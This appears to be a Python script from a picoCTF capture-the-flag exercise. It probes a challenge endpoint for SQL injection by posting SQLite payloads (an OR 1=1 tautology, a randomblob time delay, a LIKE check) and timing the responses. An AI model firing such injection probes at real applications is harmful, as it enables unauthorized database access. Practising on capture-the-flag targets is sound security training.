import requests
import time

url = 'http://saturn.picoctf.net:58885/data'

# Test time-based SQL injection
# SQLite delay: randomblob(N) or like
payloads = [
    ("ID=1", 0),  # baseline
    ("ID=1' OR 1=1--", 0),
    ("ID=1' OR 1=2--", 0),
    ("ID=1' AND randomblob(50000000)='1", 0),  # potential delay
    ("ID=1' OR LIKE('abcdefg','%')--", 0),
]

for data, _ in payloads:
    start = time.time()
    r = requests.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
    elapsed = time.time() - start
    print(f'Payload: {data}')
    print(f'  Status: {r.status_code}, Length: {len(r.text)}, Time: {elapsed:.3f}s')
    print(f'  Content-Length header: {r.headers.get("Content-Length")}')
    print()